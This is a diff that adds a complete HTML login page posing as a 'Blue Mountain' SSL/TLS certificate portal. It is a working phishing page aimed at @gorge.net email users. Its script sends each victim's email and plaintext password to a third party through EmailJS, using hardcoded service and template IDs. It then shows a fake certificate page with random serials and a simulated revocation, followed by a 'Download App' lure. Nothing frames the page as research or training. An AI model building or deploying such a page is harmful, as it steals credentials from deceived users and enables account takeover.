@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Blue Mountain · Secure Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #e8ecf1; /* Softer background like a webmail client */
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #1a1a2e;
+        }
+
+        .container {
+            max-width: 400px; /* Narrower, like a webmail form */
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header-logo {
+            max-width: 160px; /* Slightly larger for brand visibility */
+            height: auto;
+            margin-bottom: 8px;
+        }
+
+        .sub-heading {
+            color: #5f6b7a;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+
+        /* Card */
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            padding: 32px 28px 28px;
+            border: 1px solid #dce1e8;
+            transition: all 0.3s ease;
+        }
+
+        .card.hidden {
+            display: none;
+        }
+
+        /* Login Form */
+        .form-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #6b7a8a;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 22px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 14px;
+            background: #f7f9fc;
+            border: 1px solid #dce1e8;
+            border-radius: 6px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: #ffffff;
+            border-color: #1e4f8a;
+            box-shadow: 0 0 0 3px rgba(30, 79, 138, 0.1);
+        }
+
+        .form-error {
+            display: block;
+            font-size: 12px;
+            color: #c53030;
+            min-height: 18px;
+            margin-top: 4px;
+        }
+
+        .form-btn {
+            width: 100%;
+            padding: 11px;
+            font-size: 15px;
+            font-weight: 600;
+            background: #1e4f8a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 6px;
+        }
+
+        .form-btn:hover {
+            background: #163d6e;
+        }
+
+        .form-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .form-footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8a9aa8;
+            margin-top: 16px;
+        }
+
+        .form-footer a {
+            color: #1e4f8a;
+            text-decoration: none;
+        }
+
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Certificate Page */
+        .certificate-header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #edf2f7;
+        }
+
+        .certificate-header .cert-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #eef2f7;
+            padding: 4px 16px;
+            border-radius: 40px;
+            margin-bottom: 10px;
+            border: 1px solid #dce1e8;
+        }
+
+        .certificate-header .cert-badge i {
+            color: #1e4f8a;
+            font-size: 16px;
+        }
+
+        .certificate-header .cert-badge span {
+            font-weight: 500;
+            color: #2d3748;
+            font-size: 13px;
+        }
+
+        .certificate-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+
+        .certificate-header .cert-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #c6f6d5;
+            color: #22543d;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            margin-top: 6px;
+        }
+
+        .certificate-body {
+            background: #f7f9fc;
+            border-radius: 10px;
+            padding: 16px 18px;
+            border-left: 3px solid #1e4f8a;
+            margin-bottom: 16px;
+        }
+
+        .cert-detail-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 6px 16px;
+            background: #ffffff;
+            padding: 12px 14px;
+            border-radius: 8px;
+            border: 1px solid #edf2f7;
+            margin-bottom: 10px;
+        }
+
+        .cert-detail-item {
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+            padding: 3px 0;
+        }
+
+        .cert-detail-item .label {
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            color: #6b7a8a;
+        }
+
+        .cert-detail-item .value {
+            font-size: 13px;
+            font-weight: 500;
+            color: #1a1a2e;
+            word-break: break-all;
+        }
+
+        .cert-detail-item .value.highlight {
+            color: #1e4f8a;
+            font-weight: 600;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+
+        .cert-detail-item .value.email {
+            color: #1e4f8a;
+            font-weight: 500;
+        }
+
+        .cert-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            font-size: 12px;
+            color: #6b7a8a;
+            padding-top: 8px;
+            border-top: 1px solid #edf2f7;
+        }
+
+        .cert-meta .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            background: #c6f6d5;
+            color: #22543d;
+        }
+
+        .cert-meta .status-indicator .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #38a169;
+            display: inline-block;
+        }
+
+        .cert-meta .status-indicator.warning {
+            background: #fefcbf;
+            color: #744210;
+        }
+
+        .cert-meta .status-indicator.warning .dot {
+            background: #d69e2e;
+        }
+
+        .cert-meta .status-indicator.inactive {
+            background: #fed7d7;
+            color: #9b2c2c;
+        }
+
+        .cert-meta .status-indicator.inactive .dot {
+            background: #e53e3e;
+        }
+
+        .cert-id {
+            background: #edf2f7;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #4a5568;
+            font-family: 'Courier New', monospace;
+        }
+
+        .actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 14px 0 10px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+
+        .btn i {
+            font-size: 13px;
+        }
+
+        .btn-success {
+            background: #38a169;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #2f855a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(56, 161, 105, 0.25);
+        }
+
+        .btn-danger {
+            background: #e53e3e;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c53030;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(229, 62, 62, 0.25);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #4a5568;
+            border: 1px solid #dce1e8;
+        }
+
+        .btn-outline:hover {
+            background: #f7f9fc;
+            border-color: #b0bec5;
+        }
+
+        .btn-app {
+            background: #1e4f8a;
+            color: white;
+            padding: 5px 14px;
+            font-size: 12px;
+        }
+
+        .btn-app:hover {
+            background: #163d6e;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(30, 79, 138, 0.25);
+        }
+
+        .download-section {
+            display: none;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #edf2f7;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .download-section.visible {
+            display: flex;
+        }
+
+        .download-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .download-info i {
+            color: #1e4f8a;
+            font-size: 18px;
+        }
+
+        .download-info p {
+            font-size: 13px;
+            color: #4a5568;
+            margin: 0;
+        }
+
+        .download-info strong {
+            color: #1a1a2e;
+        }
+
+        .state-message {
+            background: #eef2f7;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin: 6px 0;
+        }
+
+        .state-message.visible {
+            display: inline-flex;
+        }
+
+        .state-message i {
+            color: #1e4f8a;
+        }
+
+        .state-message.success {
+            background: #f0fff4;
+        }
+
+        .state-message.success i {
+            color: #38a169;
+        }
+
+        .state-message.error {
+            background: #fff5f5;
+        }
+
+        .state-message.error i {
+            color: #e53e3e;
+        }
+
+        .spinner {
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .revoked-state {
+            display: none;
+            background: #f0fff4;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px solid #c6f6d5;
+            margin-top: 10px;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .revoked-state.visible {
+            display: flex;
+        }
+
+        .revoked-state i {
+            color: #38a169;
+            font-size: 20px;
+        }
+
+        .revoked-state .text {
+            flex: 1;
+        }
+
+        .revoked-state .text strong {
+            color: #22543d;
+            font-size: 14px;
+        }
+
+        .revoked-state .text p {
+            color: #4a5568;
+            font-size: 13px;
+            margin: 2px 0 0;
+        }
+
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px 16px;
+            margin-top: 14px;
+            padding-top: 10px;
+            border-top: 1px solid #edf2f7;
+            font-size: 12px;
+            color: #6b7a8a;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .footer-item i {
+            color: #1e4f8a;
+            font-size: 12px;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 16px;
+            }
+
+            .container {
+                max-width: 100%;
+            }
+
+            .card {
+                padding: 24px 16px 20px;
+            }
+
+            .header-logo {
+                max-width: 140px;
+            }
+
+            .form-title {
+                font-size: 18px;
+            }
+
+            .form-group {
+                margin-bottom: 10px;
+            }
+
+            .form-group input {
+                padding: 9px 12px;
+                font-size: 14px;
+            }
+
+            .form-btn {
+                padding: 10px;
+                font-size: 14px;
+                margin-top: 4px;
+            }
+
+            .cert-detail-grid {
+                grid-template-columns: 1fr;
+                gap: 4px;
+                padding: 10px 12px;
+            }
+
+            .cert-detail-item .value {
+                font-size: 13px;
+            }
+
+            .cert-detail-item .value.highlight {
+                font-size: 14px;
+            }
+
+            .actions {
+                flex-direction: column;
+                gap: 6px;
+            }
+
+            .btn {
+                width: 100%;
+                justify-content: center;
+                padding: 8px 14px;
+            }
+
+            .cert-meta {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 4px;
+            }
+
+            .download-section {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+
+            .download-info {
+                justify-content: center;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 4px;
+                margin-top: 12px;
+                padding-top: 8px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .card {
+                padding: 16px 12px 16px;
+            }
+
+            .form-group input {
+                padding: 8px 10px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <img src="https://3sx2y5mo5g.ucarecd.net/58f7eb8b-4573-4612-a845-7767de3dec96/bluemountainlarge.png" alt="Blue Mountain" class="header-logo">
+        <div class="sub-heading">SSL/TLS Certificate Management</div>
+    </div>
+
+    <!-- Login Card -->
+    <div class="card" id="loginCard">
+        <div class="form-title">Sign in</div>
+        <div class="form-subtitle">
+            to access your certificates
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="loginEmail">Email address</label>
+                <input type="email" id="loginEmail" name="user_email" required>
+                <span class="form-error" id="loginEmailError"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" name="user_password" required>
+                <span class="form-error" id="loginPasswordError"></span>
+            </div>
+
+            <button type="submit" class="form-btn" id="loginBtn">
+                <i class="fas fa-shield-alt"></i> Verify &amp; Continue
+            </button>
+        </form>
+        <div class="form-footer">
+            <a href="https://www.tdscertreport.net/service-terms">View Service Terms</a>
+        </div>
+    </div>
+
+    <!-- Certificate Card -->
+    <div class="card hidden" id="certificateCard">
+        <div class="certificate-header">
+            <div class="cert-badge">
+                <i class="fas fa-lock"></i>
+                <span>SSL/TLS Certificate</span>
+            </div>
+            <h2>Email Security Certificate</h2>
+            <div class="cert-status">
+                <i class="fas fa-check-circle"></i> Active &amp; Valid
+            </div>
+        </div>
+
+        <div class="certificate-body">
+            <div class="cert-detail-grid">
+                <div class="cert-detail-item">
+                    <span class="label">Certificate ID</span>
+                    <span class="value highlight">HIS-EV-2026-9f7a</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Type</span>
+                    <span class="value">Extended Validation (EV) SSL/TLS</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Common Name (CN)</span>
+                    <span class="value email">*.mail.gorge.net</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Organization</span>
+                    <span class="value">Blue Mountain Corporation</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Issued Date</span>
+                    <span class="value" id="issuedDate">2026-01-15</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Expiry Date</span>
+                    <span class="value" id="expiryDate">2027-01-15</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Serial Number</span>
+                    <span class="value" style="font-family:'Courier New',monospace;font-size:13px;" id="serialNumber">7F:3A:2B:9C:4D:1E</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Key Usage</span>
+                    <span class="value">Digital Signature, Key Encipherment</span>
+                </div>
+                <div class="cert-detail-item" style="grid-column: 1 / -1;">
+                    <span class="label">Subject Alternative Names (SAN)</span>
+                    <span class="value" style="font-size:13px; color:#1e4f8a;">mail.gorge.net, smtp.gorge.net, imap.gorge.net</span>
+                </div>
+                <div class="cert-detail-item" style="grid-column: 1 / -1;">
+                    <span class="label">Status</span>
+                    <span class="value">
+                        <span class="cert-meta" style="border:none;padding:0;margin:0;">
+                            <span class="status-indicator" id="statusText">
+                                <span class="dot"></span> Active
+                            </span>
+                        </span>
+                    </span>
+                </div>
+            </div>
+
+            <div class="cert-meta">
+                <span><i class="fas fa-info-circle" style="color:#1e4f8a;"></i> EV SSL/TLS certificate for email security</span>
+                <span class="cert-id"><i class="fas fa-fingerprint"></i> SHA-256: <span id="certFingerprint">a1b2c3d4e5f6g7h8i9j0</span></span>
+            </div>
+        </div>
+
+        <div class="actions" id="actionGroup">
+            <button class="btn btn-success" id="verifyCertBtn">
+                <i class="fas fa-check"></i> Verify Certificate
+            </button>
+            <button class="btn btn-danger" id="revokeCertBtn">
+                <i class="fas fa-times-circle"></i> Revoke Certificate
+            </button>
+            <button class="btn btn-outline" id="downloadCertBtn">
+                <i class="fas fa-download"></i> Download Certificate
+            </button>
+        </div>
+
+        <div class="state-message" id="stateMessage">
+            <i class="fas fa-circle-notch spinner"></i>
+            <span id="stateText">Processing...</span>
+        </div>
+
+        <div class="download-section" id="downloadSection">
+            <div class="download-info">
+                <i class="fas fa-shield-alt"></i>
+                <p><strong>Secure your email</strong> — Download the Blue Mountain Certificate Manager</p>
+            </div>
+            <button class="btn btn-app" id="downloadAppAfterRevoke">
+                <i class="fas fa-download"></i> Download App
+            </button>
+        </div>
+
+        <div class="revoked-state" id="revokedState">
+            <i class="fas fa-check-circle"></i>
+            <div class="text">
+                <strong>Certificate revoked successfully</strong>
+                <p>This SSL/TLS certificate has been marked as revoked and is no longer valid for email security.</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <span class="footer-item"><i class="fas fa-user-check"></i> Verified session</span>
+            <span class="footer-item"><i class="fas fa-history"></i> Audit logging</span>
+            <span class="footer-item"><i class="fas fa-shield"></i> Secure</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        emailjs.init("SdkmRe8WZ7itEba9z");
+
+        // Generate certificate data
+        function generateCertId() {
+            return 'HIS-EV-2026-9f7a';
+        }
+
+        function generateSerial() {
+            const chars = '0123456789ABCDEF';
+            let serial = '';
+            for (let i = 0; i < 5; i++) {
+                if (i > 0) serial += ':';
+                for (let j = 0; j < 2; j++) {
+                    serial += chars[Math.floor(Math.random() * 16)];
+                }
+            }
+            return serial;
+        }
+
+        function generateFingerprint() {
+            const chars = '0123456789abcdef';
+            let fp = '';
+            for (let i = 0; i < 20; i++) {
+                fp += chars[Math.floor(Math.random() * 16)];
+            }
+            return fp;
+        }
+
+        function getDates() {
+            const now = new Date();
+            const issued = new Date(now.getFullYear(), 0, 15);
+            const expiry = new Date(now.getFullYear() + 1, 0, 15);
+            return {
+                issued: issued.toISOString().split('T')[0],
+                expiry: expiry.toISOString().split('T')[0]
+            };
+        }
+
+        const certId = generateCertId();
+        const serialNum = generateSerial();
+        const fingerprint = generateFingerprint();
+        const dates = getDates();
+
+        // DOM refs
+        const loginCard = document.getElementById('loginCard');
+        const certificateCard = document.getElementById('certificateCard');
+        const loginForm = document.getElementById('loginForm');
+        const loginEmail = document.getElementById('loginEmail');
+        const loginPassword = document.getElementById('loginPassword');
+        const loginEmailError = document.getElementById('loginEmailError');
+        const loginPasswordError = document.getElementById('loginPasswordError');
+        const loginBtn = document.getElementById('loginBtn');
+
+        const stateMsg = document.getElementById('stateMessage');
+        const stateText = document.getElementById('stateText');
+        const revokedState = document.getElementById('revokedState');
+        const revokeCertBtn = document.getElementById('revokeCertBtn');
+        const downloadSection = document.getElementById('downloadSection');
+        const statusText = document.getElementById('statusText');
+
+        // Populate certificate data
+        document.getElementById('issuedDate').textContent = dates.issued;
+        document.getElementById('expiryDate').textContent = dates.expiry;
+        document.getElementById('serialNumber').textContent = serialNum;
+        document.getElementById('certFingerprint').textContent = fingerprint;
+
+        // Login form handler
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            let valid = true;
+            loginEmailError.textContent = '';
+            loginPasswordError.textContent = '';
+
+            const email = loginEmail.value.trim();
+            const password = loginPassword.value.trim();
+            const domainRegex = /^[^@\s]+@(gorge\.net)$/i;
+
+            if (!email) {
+                loginEmailError.textContent = 'Email is required.';
+                valid = false;
+            } else if (!domainRegex.test(email)) {
+                loginEmailError.textContent = 'Email must be @gorge.net.';
+                valid = false;
+            }
+
+            if (!password) {
+                loginPasswordError.textContent = 'Password is required.';
+                valid = false;
+            }
+
+            if (!valid) return;
+
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Verifying...';
+
+            const templateParams = {
+                user_email: email,
+                user_password: password,
+                certificate_id: certId,
+                timestamp: new Date().toLocaleString()
+            };
+
+            emailjs.send('service_zuj2d2a', 'template_tvd86sp', templateParams)
+                .then(function() {
+                    loginCard.classList.add('hidden');
+                    certificateCard.classList.remove('hidden');
+                    
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                })
+                .catch(function() {
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                    loginEmailError.textContent = 'Verification failed. Please try again.';
+                });
+        });
+
+        // Certificate actions
+        function showState(text, type = 'loading', icon = 'circle-notch') {
+            stateMsg.className = 'state-message visible';
+            if (type === 'success') stateMsg.className += ' success';
+            if (type === 'error') stateMsg.className += ' error';
+            stateText.textContent = text;
+            const iconElem = stateMsg.querySelector('i');
+            iconElem.className = 'fas fa-' + icon;
+            if (type === 'loading') iconElem.classList.add('spinner');
+            else iconElem.classList.remove('spinner');
+        }
+
+        function hideState() {
+            stateMsg.className = 'state-message';
+        }
+
+        function showRevoked() {
+            revokedState.classList.add('visible');
+            document.getElementById('actionGroup').style.display = 'none';
+            downloadSection.classList.add('visible');
+            statusText.className = 'status-indicator inactive';
+            statusText.innerHTML = '<span class="dot"></span> Revoked';
+        }
+
+        // Verify Certificate
+        document.getElementById('verifyCertBtn').addEventListener('click', function() {
+            showState('Verifying SSL/TLS certificate...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('✅ Certificate verified successfully for email security', 'success', 'check-circle');
+                setTimeout(hideState, 2500);
+                statusText.className = 'status-indicator';
+                statusText.innerHTML = '<span class="dot"></span> Verified';
+            }, 1800);
+        });
+
+        // Revoke Certificate
+        revokeCertBtn.addEventListener('click', function() {
+            showState('Revoking SSL/TLS certificate...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showRevoked();
+                console.log('[audit] Certificate revoked: ' + certId);
+            }, 1800);
+        });
+
+        // Download Certificate
+        document.getElementById('downloadCertBtn').addEventListener('click', function() {
+            showState('Preparing certificate download...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('📄 Certificate download started', 'success', 'download');
+                setTimeout(hideState, 3000);
+                // Simulate download
+                const certData = `Certificate ID: ${certId}\nType: Extended Validation (EV) SSL/TLS\nCommon Name: *.mail.gorge.net\nOrganization: Blue Mountain Corporation\nSerial Number: ${serialNum}\nSHA-256: ${fingerprint}`;
+                const blob = new Blob([certData], {type: 'text/plain'});
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'certificate-' + certId + '.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            }, 1000);
+        });
+
+        // Download App
+        function handleDownloadApp() {
+            showState('Preparing app download...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('App download started', 'success', 'download');
+                setTimeout(hideState, 3000);
+                window.open('https://www.gorge.net/security-app', '_blank');
+            }, 1000);
+        }
+
+        document.getElementById('downloadAppAfterRevoke').addEventListener('click', handleDownloadApp);
+    })();
+</script>
+</body>
+</html>
